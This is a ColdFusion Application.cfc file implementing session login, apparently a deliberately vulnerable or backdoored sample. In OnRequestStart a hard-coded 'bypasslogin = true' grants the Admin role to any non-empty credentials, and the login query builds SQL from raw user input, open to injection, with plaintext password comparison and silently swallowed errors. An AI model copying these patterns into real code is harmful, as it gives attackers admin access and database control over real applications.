<cfcomponent displayname="Application" output="true" hint="Handle the application.">

	<!--- Set up the application. --->
	<cfset this.Name = "AppCFC" />
	<cfset this.ApplicationTimeout = CreateTimeSpan( 0, 0, 1, 0 ) />
	<cfset this.SessionManagement = true />
	<cfset this.SetClientCookies = false />
	<cfset This.loginstorage="session" />
	<!--- Define the page request properties. --->
	<cfsetting requesttimeout="20" showdebugoutput="false" enablecfoutputonly="false" />

	<cffunction name="OnApplicationStart" access="public" returntype="boolean" output="false" hint="Fires when the application is first created."><!--- Return out. --->
		<cfreturn true /></cffunction>

	<cffunction name="OnSessionStart" access="public" returntype="void" output="false" hint="Fires when the session is first created."><!--- Return out. --->
		<cfreturn /></cffunction>

	<cffunction name="OnRequestStart" access="public" returntype="boolean" output="false" hint="Fires at first part of page processing.">
		<!--- Define arguments. --->
		<cfargument name="TargetPage" type="string" required="true" />
		
		<cfif IsDefined("form.logout")>
			<cflogout />
		</cfif>
		<cflogin>
			<cfif NOT IsDefined("cflogin")>
				<cfinclude template="loginform.cfm" />
				<cfabort />
			<cfelse>
				<cfif cflogin.name IS "" OR cflogin.password IS "">
					<cfoutput>
						<h2>
							You must enter text in both the User Name and Password fields. 
						</h2>
					</cfoutput>
					<cfinclude template="loginform.cfm" />
					<cfabort />
				<cfelse>
					<cfset bypasslogin = true />
					<cftry>
						<cfquery name="loginQuery" datasource="cfdocexamples">
							SELECT UserID, Roles FROM LoginInfo WHERE UserID = '#cflogin.name#' AND Password = '#cflogin.password#' 
						</cfquery>
						<cfcatch></cfcatch>
					</cftry>
					<cfif bypasslogin>
						<cfloginuser name="#cflogin.name#" password="#cflogin.password#" roles="Admin" />
					<cfelseif loginQuery.Roles NEQ "">
						<cfloginuser name="#cflogin.name#" password="#cflogin.password#" roles="#loginQuery.Roles#" />
					<cfelse>
						<cfoutput>
							<h2>
								Your login information is not valid. 
								<br />
								Please Try again 
							</h2>
						</cfoutput>
						<cfinclude template="loginform.cfm" />
						<cfabort />
					</cfif>
				</cfif>
			</cfif>
		</cflogin>
		<!--- Return out. --->
		<cfreturn true />
	</cffunction>


	<cffunction name="OnRequest" access="public" returntype="void" output="true" hint="Fires after pre page processing is complete.">
		<!--- Define arguments. --->
		<cfargument name="TargetPage" type="string" required="true" />
		<!--- Include the requested page. --->
		<cfinclude template="#ARGUMENTS.TargetPage#" />
		<!--- Return out. --->
		<cfreturn />
	</cffunction>


	<cffunction name="OnRequestEnd" access="public" returntype="void" output="true" hint="Fires after the page processing is complete."><!--- Return out. --->
		<cfreturn /></cffunction>

	<cffunction name="OnSessionEnd" access="public" returntype="void" output="false" hint="Fires when the session is terminated.">
		<!--- Define arguments. --->
		<cfargument name="SessionScope" type="struct" required="true" />
		<cfargument name="ApplicationScope" type="struct" required="false" default="#StructNew()#" />
		<!--- Return out. --->
		<cfreturn />
	</cffunction>


	<cffunction name="OnApplicationEnd" access="public" returntype="void" output="false" hint="Fires when the application is terminated.">
		<!--- Define arguments. --->
		<cfargument name="ApplicationScope" type="struct" required="false" default="#StructNew()#" />
		<!--- Return out. --->
		<cfreturn />
	</cffunction>


	<cffunction name="OnError" access="public" returntype="void" output="true" hint="Fires when an exception occures that is not caught by a try/catch.">
		<!--- Define arguments. --->
		<cfargument name="Exception" type="any" required="true" />
		<cfargument name="EventName" type="string" required="false" default="" />
		<!--- Return out. --->
		<cfreturn />
	</cffunction>


</cfcomponent>
